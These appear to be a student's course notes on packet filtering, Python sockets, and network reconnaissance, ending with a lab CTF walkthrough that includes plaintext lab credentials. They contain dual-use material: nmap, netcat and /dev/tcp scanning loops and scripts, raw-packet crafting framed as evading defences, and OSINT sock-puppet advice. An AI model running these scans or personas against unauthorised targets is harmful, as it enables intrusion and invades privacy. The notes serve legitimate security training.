  "ip[8]<=64 or ip6[7]<=64"

Search for ICMPv4(6), TCP, or UDP encapsulated within an ipv4(6) packet. #Filter for UDP and TCP Packets#
  'ip[9] = 0x01'
  'ip[9] = 0x06'
  'ip[9] = 0x11'
  'ip6[6] = 0x3A'
  'ip6[6] = 0x06'
  'ip6[6] = 0x11'
   example:
      'ip[9] = 0x11||ip6[6] = 0x11' (will filter for all UDP packets utilizing ipv4 and ipv6 headers)
      sudo tcpdump -n "ip[9] = 0x11||ip6[6] = 0x11" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l

      
Search for ipv4 source or destination address of 10.1.1.1.
  'ip[12:4] = 0x0a010101'
  'ip[16:4] = 0x0a010101'

Search for ipv6 source or destination address starting with FE80.
  'ip6[8:2] = 0xfe80'
  'ip6[24:2] = 0xfe80'

Search for #TCP source port# 3389.
  'tcp[0:2] = 3389'
    example:
      'tcp[0:2] > 1024 || udp[0:2] > 1024' (this will filter for all ports greater than 1024)
      sudo tcpdump -n "tcp[0:2] > 1024 || udp[0:2] > 1024" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l

      
Search for TCP destination port 3389.
  'tcp[2:2] = 3389'

Search for TCP source or destination port 3389.
  'tcp[0:2] = 0x0d3d || tcp[2:2] = 0x0d3d'

Search for TCP with options.
  'tcp[12] & 0xF0 > 0x50'
  'tcp[12] & 240 > 80'

Search for TCP Reserve field with a value.
  'tcp[12] & 0x0F != 0'
  'tcp[12] & 15 > 0'

Search for TCP Flags set to ACK+SYN. No other flags can be set.
  'tcp[13] = 0x12'

Search for TCP Flags set to ACK+SYN. The other flags are ignored.
  'tcp[13] & 0x12 = 0x12'

Search for TCP Flags ACK and SYN (both or 1 must be on).
  'tcp[13] & 0x12 != 0'
  'tcp[13] & 0x12 > 0'

Search for TCP Urgent Pointer having a value.
  'tcp[18:2] != 0'
  'tcp[18:2] > 0'

Filtering for #TCP Flags Examples FOR BPFs#
    "tcp[13] = 20 || tcp[13] = 17" (this will filter for all packets with the ACK/RST or ACK/FIN flags set).
    sudo tcpdump -n "tcp[13] = 20 || tcp[13] = 17" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l
    "tcp[13]=2" (this will filer for initial packets from a client trying to initiate a connection)
    "tcp[13]=18" (this will filter for response packets from a server listening on an open TCP port)
    "tcp[13]=4" (this will filter for packets from a server with closed tcp ports. The reset (4) bit indicates the port was not open.)
    "tcp[2:2]<1024||udp[2:2]<1024" (this will filter for all tcp and udp packets sent to the well known ports)
    "tcp[0:2]=80||tcp[2:2]=80" (this will filter for all http traffic)
    "tcp[0:2]=23||tcp[2:2]=23" (this will filter for all telnet traffic)
    "ether[12:2]=0x0806" (this will filter for all ARP traffic--remember, ARP is filtered for through the ethernet header)"
    "ip[6] & 128 != 0" or "ip[6] & 128 = 128" (this will filter to capture if the "evil bit" is set, the IP header is used here)
    "ip[9]=0x10" (This will filter for the chaos protocol, which can be found filtered through the ipv4 (ip) filter).
    "ip[1]>>2=37" (this will filter for packets with the DSCP field of 37. The '>>2' is necessary as it indicates the 2 bit shift to the right, which is required for the DSCP field).
    "(ip[9]=0x01 || ip[9]=0x11) && ip[8]=1" (This will will look for potential traceroutes betweeen linux and windows systems (and others), AND a TTL of 1 (which is the beginning of each             traceroute, otherwise it would give us much more results for each recorded (incremeneted) Time to live value)) 
    "tcp[13]&32=0&&tcp[18:2]!=0" (this will filter for all packets where the urg value is not set (32) and the urg pointer HAS a value (!=0))
    "ip[16:4]=0x0a0a0a0a && tcp[13]=0" (this will first filter for the IP address 10.10.10.10 (in hex, it is 0x0a0a0a0a) and where all tcp flags are null (basically, no TCP flags), which is         0, and the reason why it is tcp[13]=0"
    "ether[12:4] & 0xffff0fff = 0x81000001 && ether[16:4] & 0xffff0fff = 0x8100000a" (this will filter for #VLAN Hopping#. The 0xffff0fff isn't too important to understand, it essentially           identifies the area you're searching through, though. the 0x81000001 indicates the position of the VLAN (VLAN '1'), and that's why there's a 1 at the end of it. Likewise for the               0x8100000a, which is VLAN 10 (represented by the 'a' in hex). This essentially filters for hopping between these two VLANs).
    
Write Shark filters for BPFs. #Wireshark BPFs#
    Capture filters - used to specify which packets should be saved to disk while capturing.
    Display filters - allow you to change the view of what packets are displayed of those that are captured.

use filter: (example)
  host 172.16.82.106 && (tcp0:2]==80 or tcp 2:2]=80)

Filter for #Specific IP ID#
    'ip[4:2] == 213' (will filter for the specific ip id)
    sudo tcpdump -n " ip[4:2] == 213" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l

Filter for #VLAN TAG#
    "ether[12:2]==0x8100" (filters for specific VLAN TAG)
    sudo tcpdump -n "ether[12:2]==0x8100" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l

Wireshark can use most primitives and/or BPFs.

Useful Wireshark menu:
  Protocol Hierarchy

To decrypt traffic in Wireshark
  Menu → Edit → Preference → Protocols → SSL

How to filter for for ports across TCP and UDP
  Example:
    "tcp[2:2]=53 || tcp[0:2]=53 || udp[2:2]=53 || udp[0:2]=53" (this one will filter for DNS for both UDP and TCP).
    sudo tcpdump -n "tcp[2:2]=53 || tcp[0:2]=53 || udp[2:2]=53 || udp[0:2]=53" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l


P0F Signature Database #P0F Signature Database#, used for passive fingerprinting. Basically looking for handshakes/exchanges. (this is not part of wireshark or tcpdump)
  Learn as much as you can about P0f because it will be on the final exam, could be 5 questions. 
  less /etc/p0f/p0f.fp
  p0f -h
  p0f -i eth0
  p0f -r capture.pcap
  p0f -r wget.pcap -o /var/log/p0f.log
  cat /var/log/p0f.log | grep {expression}





















Socket Programming
======================
======  Day 3  =======
======================











The point of this lesson is to understand TCP Stream, UDP Datagram, and RAW sockets and their vital role as elements for cyber security professionals due to their rolel in network communication protocols. TCP enables reliable, connection-oriented data transmission. UDP Datagram provides lightweight, connectionless communication. RAW sockets provide low-level access to network interfaces. Mastering these allows professionals to analyze network traffic, detect anomalies and develop robust security measures to safeguard against a wide range of cyber threats to enhance the overall resilience of organizational networks. 

Socket Types
  Stream Sockets - Connection oriented and sequenced; methods for connection establishment and tear-down. Used with TCP, SCTP, and Bluetooth.
  Datagram Sockets - Connectionless; designed for quickly sending and receiving data. Used with UDP.
  RAW Sockets - Direct sending and receiving of IP packets without automatic protocol-specific formatting.

User Space vs. Kernel Space Sockets
   User Space Sockets
      Stream Sockets
      Datagram Sockets
   Kernel Space Sockets
      RAW Sockets

Socket Creation and Privilege Level
  User Space Sockets - The most common sockets that do not require elevated privileges to perform actions on behalf of user applications.
  Kernel Space Sockets - Attempts to access hardware directly on behalf of a user application to either prevent encapsulation/decapsulation or to create packets from scratch, which requires elevated privileges.

Userspace applications/sockets:
    Using tcpdump or wireshark to read a file
    Using nmap with no switches
    Using netcat to connect to a listener
    Using netcat to create a listener above the well known port range (1024+)
    Using /dev/tcp or /dev/udp to transmit data

Kernel Space Applications/Sockets
    Using tcpdump or wireshark to capture packets on the wire
    Using nmap for OS identification or to set specific flags when scanning
    Using netcat to create a listener in the well known port range (0 - 1023)

Kernel Space Applications/Sockets
    Using Scapy to craft or modify a packet for transmission
    Using Python to craft or modify RAW Sockets for transmission
    Network devices using routing protocols such as OSPF
    Any Traffic without Transport Header (ICMP)

Understanding Python Terminology #Python#
    Libraries (Standard Python Library) ; (prebuilt storage locations to grab modules from, and these modules have functions)
        Modules (_import module)
            Functions (module.function)
            Exceptions (try:)
            Constants (AF_INET)
            Objects ()
            List [] vs Tuple ()

#Python String# String (example):
    my_string = "Hello World"
    Bytes-like-object
      message = b"Hello World"

#Python Integer# Integer (examples):
    int = 1234
    float = 3.14
    hex = 0x45

#Python Built In Functions#  (Examples):
    int()
    len() (number of characters in an object)
    str()
    sum()
    print() (prints to screen)

#Python Built-In Methods# (Examples):
    my_string.upper()
    my_string.lower()
    my_string.split()
    my_list.append()
    my_list.insert()

#Python How Imports Work#
  -Be careful not to import a module over one you have already imported. 
    import {module}
    import {module} as {name}
    from {module} import * (imports everything from the provided module)
    from {module} import {function}
    from {module} import {function} as {name}


Python3 Libraries and References
  Socket
  Struct (example struct.pack is used to combine various pieces of your raw socket packet into network order.)
  Sys
  Errors
  Exceptions

#Network Programming with Python3#
  Network sockets primarily use the Python3 Socket library and socket.socket function. Example:
  
    import socket
  s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)


#The socket.socket Function#
  Inside the socket.socket. function, you have these arguments, in order:
    socket.socket( *family*, *type*, *proto* )

  family: AF_INET*, AF_INET6, AF_UNIX
  type: SOCK_STREAM*, SOCK_DGRAM, SOCK_RAW
  proto: 0*, IPPROTO_TCP, IPPROTO_UDP, IPPROTO_IP, IPPROTO_ICMP, IPPROTO_RAW


#Stream Socket Sender Demo#
    #!/usr/bin/python3
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    ip_addr = '127.0.0.1'
    port = 1111
    s.connect((ip_addr, port))
    message = b"Message"
    s.send(message)
    data, conn = s.recvfrom(1024)
    print(data.decode('utf-8'))
    s.close()

chmod +x new.py  (what I named the file), this makes it executable. 
  ss -ntlp - this will open up all listening sockets
  ss -udp
  nc -lvp 1111

open up a terminator console and type ls, 
then ./new.py


#Datagram Socket Sender Demo#
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
ip_addr = '127.0.0.1'
port = 2222
message = b"Message"
s.sendto(message, (ip_addr, port))
data, addr = s.recvfrom(1024)
print(data.decode())

chmod +x udp.py 

Raw IPV4 Sockets
  RAW Socket scripts must include the IP header and the next headers.
  Requires guidance from the "Request for Comments" (RFC) to follow header structure properly.
    RFCs contain technical and organizational documents about the Internet, including specifications and policy documents.
  See RFC 791, Section 3 - Specification for details on how to construct an IPv4 header.

Raw Socket Use Case
  Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering
  Avoiding defense mechanisms
  Obfuscating data during transfer
  Manually crafting a packet with the chosen data in header fields

Encoding and Decoding
  Encoding
    The process of taking bits and converting them using a specified cipher.
  Decoding
    Reverse of the conversion process used by the specified cipher for encoding.
  Common encoding schemes
    UTF-8, Base64, Hex

Encoding vs Encryption
  Encoding - converts data into a different format
  Encryption - scrambles data to make it unreadable without a secret key

#Hex Encoding and Decoding#
  Encode text to Hex:
    echo "Message" | xxd
    or
    xxd file.txt file-encoded.txt
  Decode file from Hex:
    xxd -r file-encoded.txt file-decoded.txt

#Python Hex Encoding#:
  import binascii

  message = b'Message'
  hidden_msg = binascii.hexlify(message)

#Base64 Encoding and Decoding#: (We'll likely see the answers encoded during class, expect different padding at the end of it, which looks like one or two equal signs '==')
  Encode text to base64:
    echo "Message" | base64
    or 
    base64 file.txt > file-encoded.txt  (new file into old file)
  Decode file from Base64:
    base64 -d file-encoded.txt > file-decoded.txt (old file into new file)
  
#Python Base64 Encoding#
  import base64
  message = b'Message'
  hidden_msg = base64.b64encode(message)


Raw IPV4 and TCP Socket Demos #RAW IPV$ and TCP SOCKET DEMO#
#!/usr/bin/python3
#For building the socket
import socket

#For system level commands
import sys

#For establishing the packet structure (Used later on), this will allow direct access to the methods and functions in the struct module
from struct import *

#Create a raw socket.
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error as msg:
    print(msg)
    sys.exit()

packet = ''
packet = ''

src_ip = "127.0.0.1"
dst_ip = "127.0.0.1"

# Lets add the IPv4 header information
ip_ver_ihl = 69  # This is putting the decimal conversion of 0x45 for Version and Internet Header Length
ip_tos = 0           # This combines the DSCP and ECN feilds
ip_len = 0           # The kernel will fill in the actually length of the packet
ip_id = 12345        # This sets the IP Identification for the packet
ip_frag = 0          # This sets fragmentation to off
ip_ttl = 64          # This determines the TTL of the packet when leaving the machine
ip_proto = 16        # This sets the IP protocol to 16 (Chaos). If this was 6 (TCP) or 17 (UDP) additional headers would be required
ip_check = 0         # The kernel will fill in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number
src_ip = "127.0.0.1"
dst_ip = "127.0.0.1"

#Lets add the IPv4 header information
ip_ver_ihl = 69  # This is putting the decimal conversion of 0x45 for Version and Internet Header Length
ip_tos = 0           # This combines the DSCP and ECN feilds
ip_len = 0           # The kernel will fill in the actually length of the packet
ip_id = 12345        # This sets the IP Identification for the packet
ip_frag = 0          # This sets fragmentation to off
ip_ttl = 64          # This determines the TTL of the packet when leaving the machine
ip_proto = 16        # This sets the IP protocol to 16 (Chaos). If this was 6 (TCP) or 17 (UDP) additional headers would be required
ip_check = 0         # The kernel will fill in the checksum for the packet
ip_srcadd = socket.inet_aton(src_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number
ip_dstadd = socket.inet_aton(dst_ip)  # inet_aton(string) will convert an IP address to a 32 bit binary number


#Getting a Message to a remote team Utilizing a specific host (BLUE_DMZ_HOST-1) using STREAM SOCKET#

coded information: 867-5309 Jenny
port number = 5309
BLUE-DMZ-HOST-1: 172.16.1.15
Message: Jenny
>vi message.py

    #!/usr/bin/python3
    import socket
    import os
    port = 5309
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    ip_addr = '172.16.1.15'
    s.connect((ip_addr, port))
    message = b"Message"
    s.send(message)
    data, conn = s.recvfrom(1024)
    print(data.decode('utf-8'))
    s.close()

#Getting a Message to a remote team utilizing the specified host (INTERNET_HOST) using DATAGRAM SOCKET#

  Port = 10000
  Message = Disturbed
  INTERNET_HOST = PROVIDED FLOAT IP (10.50.30.41)
  > vi dgram.py
  
  #!/usr/bin/python3
  import socket
  import os
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
  ip_addr = '127.0.0.1'
  port = 10000
  message = b"Disturbed"
  s.sendto(message, (ip_addr, port))
  data, addr = s.recvfrom(1024)
  print(data.decode())
  
#Modify ipraw.py #

Source IP: 10.10.0.40
Target IP: 172.16.1.15
DSCP: 24 (to change this you need to account for the ECN field as well, picuture below
                    DSCP       | ECN
                    0 0 0 0 0 0| 0 0
                    0 1 1 0 0 0| 0 0  <----
The bits were orignially shifted two to the right, to equal 24, but since DSCP and ECN are part of the same field, this must be accounted for by shifting it left)                    
IP ID: 1984
Protocol: CHAOS

use below to listen:
nc -lvp 1111

#modify tcpraw.py#

Source IP: 10.10.0.40
Target IP: 172.16.1.15
IP ID: 2020
TCP Src port: 54321
TCP Dst port: 1234
SEQ Number: 90210
ACK Number: 30905
TCP flag: SYN

use below to listen: 
nc -lvp 1111
















Service and Network Discovery
    ==================
    ====   Day 4  ====
==========================



Recon Stages
    Passive External ( 
    Active External (on the outside trying to hit something on the inside)
    Passive Internal (internal means you must be on the network. with passive, just listening and observing.)
    Active Internal (you are actively sending packets out. )


BLUE/GRAY/RED Space
    Blue Space (This is you, you have 100% authorized access here)
    Gray Space (This is the internet, i.e. the world, you must be careful not to step on other people's toes here, you will have left and right lateral limits here)
    Red Space (This is hostile space)

Recon Steps
    Network Footprinting
    Network Scanning 
    Network Enumeration (where you tie all information gathered together on your map)
    Vulnerability Assessment (identify vulnerabilities either to harden your security on your network, or exploit an enemy network)

Network Footprinting
      Collect information relating to targets:
          Networks
          Systems
          Organizations

Network Scanning
      Port Scanning (scan for open ports)
      Network Scanning (scan for open networks)
      Vulnerability Scanning 

Network Enumeration
      Network Resource and shares
      Users and Groups
      Routing tables
      Auditing and Service settings
      Machine names
      Applications and banners
      SNMP and DNS details
      Other common services and ports

Vulnerability Assessment
      Injection
      Broken Authentication
      Sensitive Data Exposure
      XML External Entities
      Broken Access Control
      Security Misconfiguration
      Software/Components with Known Vulnerabilities


#Passive External Discovery#
    
Create a Sock Puppet (Think social media. You're using a 'sock puppet', a fake account, to gather information from on other people)
      The Ultimate Guide to Sockpuppets in OSINT
      Fake Name Generator
      This Person does not exist

Useful Sites
      OSINT Framework
      Malfrat’s OSINT Map
      Mark@OSINT-Research pages
      Pentest-Standard
      SecuritySift

Passive Recon Activities  
     Open-Source Intelligence (OSINT)
     Publicly Available Information (PAI)

Passive Recon Activities
     IP Addresses and Sub-domains
     Identifying External/3rd Party sites
     Identifying People
     Identifying Technologies
     Identifying Content of Interest
     Identifying Vulnerabilities
    
IP Addresses and Sub-domains
     IP Registries:
        IANA IPv4
        IANA IPv6

IP Addresses and Sub-domains
    DNS Lookups:
        arin.net
        whois.domaintools.com
        viewdns.info
        dnsdumpster.com
        centralops.net

IP Addresses and Sub-domains
    URL Scan:
        sitereport.netcraft.com
        web-check.xyz
        web-check.as93.net
        urlscan.io

IP Addresses and Sub-domains
    IP GeoLocation lookup:
        maxmind.com
        iplocation.io
        iplocation.net
        infosniper.net

IP Addresses and Sub-domains
    BGP prefixes:
        bgpview.io
        hackertarget.com
        bgp.he.net
        bgp4.as

Identifying External/3rd Party sites
    Parent/Subordinate organizations
    Clients/Customers
    Service organizations
    Partners

Identifying People
    Target website
    Crawler tools like Maltego or Creepy
    Search engines
    Social Media
    Job Portals
    Tracking active emails
    Family Tree

Identifying Technologies
    File extensions
    Server responses
    Job listing
    Website content
    Google Hacking
    Shodan.io
    MAC OUI Lookup

Identifying Content of Interest
    /etc/passwd and /etc/shadow or SAM database
    Configuration files
    Log files
    Backup files
    Test pages
    Client-side code

Identifying Vulnerabilities
    Known Technologies
    Error messages responses
    Identify running services
    Identify running OS
    Monitor running Applications

Dig vs Whois #Ways to Look up DNS information#
    Whois - queries DNS registrar over TCP port 43
        Information about the owner who registered the domain
    Dig - queries DNS server over UDP port 53 
        Name to IP records

Whois
    whois zonetransfer.me

Dig
    dig zonetransfer.me A
    dig zonetransfer.me AAAA
    dig zonetransfer.me MX
    dig zonetransfer.me TXT
    dig zonetransfer.me NS
    dig zonetransfer.me SOA


Zone Transfer
    Between Primary and Secondary DNS over TCP port 53
    https://digi.ninja/projects/zonetransferme.php
                            dir axfr {@soa.server} {target-site}
                            dig axfr @nsztm1.digi.ninja zonetransfer.me
        

NETCRAFT
     Similar to whois but web-based
     https://sitereport.netcraft.com/

Historical Content
    Wayback Machine
    http://archive.org/web/

Google Searches
    Advanced searches.
    List of filters
    Dork Search
      site:*.ccboe.net
      site:*.ccboe.net "administrator"

Shodan
    Shodan: A search engine for Internet-connected devices
    https://www.shodan.io
    Be aware of attribution

Passive OS Fingerprinter (p0f)
    p0f: Passive scanning of network traffic and packet captures.
          more /etc/p0f/p0f.fp
          sudo p0f -i eth0
          sudo p0f -r test.pcap

Passive OS Fingerprinter (p0f)
    Examine packets sent to/from target
    Can guess Operating Systems and version
    Can guess client/server application and version

Social Tactics
    Social Engineering (Hack a person)
    Technical based (Email/SMS/Bluetooth)
    Other Types (Dumpster Diving/Shoulder Surf)

Describe Methods Used for #Active External Discovery#
    
Scanning Nature
    Active
    Passive
    
Scanning Strategy
    Remote to Local
    Local to Remote ( this strategy can be used to obscure ones scanning activities from a tgt system, while potentially implicating the transient host in legal consequences)
    Local to Local
    Remote to Remote

Scanning Approach
    Aim
        Wide range target scan
        Target specific scan
    Method
        Single source scan
            1-to-1 or 1-to-many
        Distributed scan
            many-to-one or many-to-many

Vertical Scan
    Scan some (or all ports) on a single target

Horizontal Scan
    Scan a single (or set) port(s) on a range of targets.

Strobe Scan
    Scan a predefined subset of ports on a range of targets.

Block Scan
    Scan all (or a range) ports on a range of targets.

Distributed Scan - Block
    A distributed scan uses multiple scanning systems or nodes to perform scanning activities. These systems work together to cover larger or more complex networks.

Distributed Scan - Strobe
    Each system is designated specific ports to scan across all target hosts.

#Ping#
    Ping one IP:
      ping 172.16.82.106 -c 1
    Ping a range:
      for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done

#NMAP Defaults#
    Default Scan Types:
        User: TCP Full Connect Scan (-sT)
        Root: TCP SYN Scan (-sS)
    By default the ports scanned: 1000 most commonly used TCP or UDP ports (Tell nmap what you want it to scan)

NMAP Port States (responses)
    open
    closed
    filtered
    unfiltered
    open|filtered
    closed|filtered

NMAP Scan Types
    Broadcast Ping/Ping sweep (-sP, -PE)
    SYN scan (-sS)
    Full connect scan (-sT)
    Null scan (-sN)
    FIN scan (-sF)
    XMAS tree scan (-sX)
    UDP scan (-sU) (this scan wil detect open ports by checking for the absence of ICMP port unreachable messages)
    Idle scan (-sI)
    Decoy scan (-D)
    ACK/Window scan (-sA)
    RPC scan (-sR)
    FTP scan (-b)
    OS fingerprinting scan (-O)
    Version scan (-sV)
    Discovery probes

NMAP - Other options
    -PE - ICMP Ping
    -Pn - No Ping

NMAP - Time-Out (you don't really have any businesses using these unless you know what you are doing)
    -T0 - Paranoid - 300 Sec
    -T1 - Sneaky - 15 Sec
    -T2 - Polite - 1 Sec
    -T3 - Normal - 1 Sec
    -T4 - Aggresive - 500 ms
    -T5 - Insane - 250 ms

NMAP - Delay
    --scan-delay <time> - Minimum delay between probes
    --max-scan-delay <time> - Max delay between probes

NMAP - Rate Limit
    --min-rate <number> - Minimum packets per second
    --max-rate <number> - Max packets per second

#NMAP syntax examples#:
  nmap -sV -p 22,53,110,143,4564 198.116.0-255.1-127 (Launches host enumeration and a TCP scan at the first half of each of the 255 possible eight-bit subnets in the 198.116.0.0/16 address space. This tests whether the systems run                                                           SSH, DNS, POP3, or IMAP on their standard ports, or anything on port 4564. For any of these ports found open, version detection is used to determine what application is running.)
  nmap -sS -p 22,80,443 192.168.1.0/24 (this scans all IP addresses within the 192.168.1.0 network with a /24 subnet mask)
  nmap -sn 192.168.1.1-100  (this scans all IP addresses from 192.168.1.1 to 192.168.1.100 for active hosts)
  nmap -O 192.168.1.0/24 (this attempts to identify the operating systems running on hosts within the network) 
  Remember: you can combine these options in many ways to enchance your scan to get the results you need at one time. 
  Helpful Site: https://nmap.org/book/man-examples.html

#Traceroute - Firewalking#
    traceroute 172.16.82.106
    traceroute 172.16.82.106 -p 123
    sudo traceroute 172.16.82.106 -I
    sudo traceroute 172.16.82.106 -T
    sudo traceroute 172.16.82.106 -T -p 443


Netcat - Scanning
      nc [Options] [Target IP] [Target Port(s)]
      -z : Port scanning mode i.e. zero I/O mode
      -v : Be verbose [use twice -vv to be more verbose]
      -n : do not resolve ip addresses
      -w1 : Set time out value to 1
      -u : To switch to UDP
  
#Netcat - Horizontal Scanning#
    Range of IPs for specific ports:
      --TCP--
    for i in {1..254}; do nc -nvzw1 172.16.82.$i 20-23 80 2>&1 & done | grep -E 'succ|open'
         or 
      --UDP--
    for i in {1..254}; do nc -nuvzw1 172.16.82.$i 1000-2000 2>&1 & done | grep -E 'succ|open'

#Netcat - Vertical Scanning#
    Range of ports on specific IP
      --TCP--
    nc -nzvw1 172.16.82.106 21-23 80 2>&1 | grep -E 'succ|open'   (this is looking for 'successor' or 'open' )
        or
      --UDP--
    nc -nuzvw1 172.16.82.106 1000-2000 2>&1 | grep -E 'succ|open' (this is looking for 'successor' or 'open' )

--------------------------------------------------------------------
Netcat - TCP Scan Script   #TCP SCAN SCRIPT#
    #!/bin/bash
    echo "Enter network address (e.g. 192.168.0): "
    read net
    echo "Enter starting host range (e.g. 1): "  
    read start
    echo "Enter ending host range (e.g. 254): "
    read end
    echo "Enter ports space-delimited (e.g. 21-23 80): "
    read ports
    for ((i=$start; $i<=$end; i++))
    do
        nc -nvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
    done
    (When you run this script, it will prompt you to input any required info,--
     and remember, while conducting these scans, you can still conduct passive external reconnaissance.
     Don't waste your time!)
-----------------------------------------------------------------------
Netcat - UDP Scan Script #UDP SCAN SCRIPT#
    #!/bin/bash
    echo "Enter network address (e.g. 192.168.0): "
    read net
    echo "Enter starting host range (e.g. 1): "
    read start
    echo "Enter ending host range (e.g. 254): "
    read end
    echo "Enter ports space-delimited (e.g. 21-23 80): "
    read ports
    for ((i=$start; $i<=$end; i++))
    do
        nc -nuvzw1 $net.$i $ports 2>&1 | grep -E 'succ|open'
    done
------------------------------------------------------------------------

Netcat - Banner Grabbing #BANNER GRABBING# (This is how you can know what port is on a box, using the transport layer protocol. You would get a result of TCP if you scanned 22 (ssh), this is especially convenient when 
                                            trying to see the versions of each protocol. Different versions are vulnerable to their own exploits.)
      Find what is running on a particular port (examples):
        nc [Target IP] [Target Port]
        nc 172.16.82.106 22
        nc -u 172.16.82.106 53
      -u : To switch to UDP
    Note: Sometimes this command takes a few seconds to enumerate your information. Don't Ctr+C just because it's taking a little while. 
    
Curl and Wget #CURL and WGET interface with webservers#  (WGET is by far the more helpful one. Use this one instead if you have the choice.)
    Both can be used to interact with the HTTP, HTTPS and FTP protocols.
    Curl - Displays ASCII
      curl http://172.16.82.106
      curl ftp://172.16.82.106
    Wget - The Download option is '-r' (recursive). You want to download it to get everything. It will create a directory of everything it got. You can use this with websites as a way of navigating them. It might be worth learning                how to navigate websites as a means of exploring them, instead of using the webbrowser. (Look into it!)
      Syntax:
      wget -r http://172.16.82.106
      wget -r ftp://172.16.82.106
    ftp 10.10.0.40
      ftp> get README  (learn a little more about how to make this work)

    If you get a png file, you can open it by using the 'eog' command. 
    example:
     > eog hint-01 
Describe Methods Used for #Passive Internal Discovery#
   
#Packet Sniffers#
    Wireshark
    Tcpdump
    p0f
  Limited to traffic in same local area of the network

#IP Configuration#
    Windows: ipconfig /all
    Linux: 'ip address' (ifconfig depreciated) or 'ip addr'
    VyOS: show interface

#DNS configuration#
    Windows: ipconfig /displaydns ( this command will display the contents of the DNS client resolver cache)
    Linux: cat /etc/resolv.conf

#ARP Cache#
    Windows: arp -a
    Linux: ip neighbor (arp -a depreciated)

#Network connections#
    Windows: netstat
    Linux: ss (netstat depreciated) 
    Note: when you see 0.0.0.0*, it's a wildcard; 'everything but this port'. if you see 127.0.0.1:6010, that means you can only access 6010 through loopback!
          'ss' will show what to connect to a port through. Go based of what it shows. 
          
    Example options useful for both netstat and ss: -antp
    a = Displays all active connections and ports.
    n = No determination of protocol names. Shows 22 not SSH.
    t = Display only TCP connections.
    u = Display only UDP connections.
    p = Shows which processes are using which sockets.

#Services File#
    Windows: %SystemRoot%\system32\drivers\etc\services
    Linux/Unix: /etc/services

#OS Information#
    Windows: systeminfo
    Linux: uname -a and /etc/os-release

#Running Processes#
    Windows: tasklist
    Linux: ps or top (ps - elf, htop, top -tree)
      note: to kill processes, you can you 'kill -9' or 'pkill', you need its name for pkill.
      
    Example options useful for ps: -elf
    e = Show all running processes
    l = Show long format view
    f = Show full format listing
  
#Command path#
    which        (if you don't have permission to run 'whereis' you can run this one instead)
    whereis      (whereis tcpdump - this checks for the location of tcpdump if it's installed)


#Routing Table#
    Windows: route print 
    Linux: ip route (netstat -r deprecated) (these are routes to networks)
    VyOS: show ip route
    
#File search#
    find / -name hint* 2> /dev/null 
    find / -iname flag* 2> /dev/null
  Note: (consider using these throughout the challenges. They might actually be helpful ._. )
  
#SSH Config#
    Windows: C:\Windows\System32\OpenSSH\sshd_config
    Linux: /etc/ssh/sshd_config



Describe Methods Used for #Active Internal Discovery#

Active Internal Network Reconnaissance
    Will use similar tools as Active External Network Reconnaissance
    Scope and addresses may differ

#ARP Scanning#
    arp-scan --interface=eth0 --localnet 
    nmap -sP -PR 172.16.82.96/27

#Ping Scanning# (PING SWEEPS!)
    ping -c 1 172.16.82.106
    for i in {1..254}; do (ping -c 1 172.16.82.$i | grep "bytes from" &) ; done    (this is will mass scan for all boxes within the range provided at the beginning)
    sudo nmap -sP 172.16.82.96/27
     note: Ping sweeping is the quickets way to see if the box is up. This should be the first thing you do when targetting a box. It'll save you time before mass nmap scanning, by showing you which IPs are up first!
   
#DEV TCP Banner Grab#
    exec 3<>/dev/tcp/172.16.82.106/22; echo -e "" >&3; cat <&3
    nmap -sn 192.168.1.1-100
    
#DEV TCP Scanning#
    for p in {1..1023}; do(echo >/dev/tcp/172.16.82.106/$p) >/dev/null 2>&1 && echo "$p open"; done 
   note: If you don't have netcat, you can use this isntead. 

Perform Network Forensics

#Network Forensics - Mapping# (ALWAYS REQUEST A NETWORK MAP WHEREVER YOU GO ON MISSION, this will give you a baseline of what's presently in use and allow you to pinpoint anything new)  
    Diagram devices
    Line Types
    Written Information
    Coloring
    Groupings

Network Forensics - Mapping (see link)
https://net.cybbh.io/public/networking/latest/07_discovery/fg.html#_7_5_1_map_a_network

Things to include on your Map:
    Device type (Router/host)
    System Host-names
    Interface names (eth0, eth1, etc)
    IP address and CIDRs for all interfaces
    TCP and UDP ports
    MAC Address
    OS type/version
    Known credentials

Network Mapping Tools
    Draw.io Local (Template)
    Draw.io Web
    Witeboard.com
    Draw.Chat
    SmartDraw
    Ziteboard
    Tutorialspoint Whiteboard
    Explain Everything Whiteboard


#CTFs Network Reconnaissance:#
  start by:
    > dig networking-ctfd-1.server.vta TXT
    from here you can decrypt the base64 text found, and that is your start flag.

  connect to float: ssh net1_student1@10.50.26.58 (password is: password1)
    conduct active recon against target: Red Boundry Router
        for i in {1..254}; do (ping -c 1 172.16.120.$i | grep "bytes from" &) ; done 
        result:
      64 bytes from 172.16.120.1: icmp_seq=1 ttl=62 time=0.877 ms
      64 bytes from 172.16.120.2: icmp_seq=1 ttl=63 time=0.329 ms
      64 bytes from 172.16.120.10: icmp_seq=1 ttl=62 time=0.605 ms
      64 bytes from 172.16.120.9: icmp_seq=1 ttl=61 time=1.50 ms
      64 bytes from 172.16.120.18: icmp_seq=1 ttl=61 time=0.821 ms
      64 bytes from 172.16.120.17: icmp_seq=1 ttl=60 time=2.09 ms

        maybe perform nmap against these targets?

    you can also SSH into the router: ssh vyos@172.16.120.1 (password is: password), hostname RED-SCR ,
      to get hostname: show host name [enter]
    
    Routers that vyos@172.16.120.1 is connected to: 
                  
